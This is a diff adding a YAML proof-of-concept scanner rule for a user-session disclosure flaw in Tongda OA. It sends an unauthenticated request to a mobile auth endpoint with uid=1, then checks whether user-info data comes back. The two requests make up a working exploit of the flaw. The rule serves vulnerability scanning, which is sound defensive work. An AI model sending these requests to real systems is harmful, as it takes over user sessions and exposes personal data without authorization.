@@ -1,0 +1,16 @@
+name: poc-yaml-tongda-user-session-disclosure
+rules:
+  - method: GET
+    path: /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+    follow_redirects: false
+    expression: "true"
+
+  - method: POST
+    path: /general/userinfo.php?UID=1
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"dept_name\":\"") && response.body.bcontains(b"\"online_flag\":") && response.headers["Content-Type"].contains("application/json")
+detail:
+  author: kzaopa(https://github.com/kzaopa)
+  links:
+    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
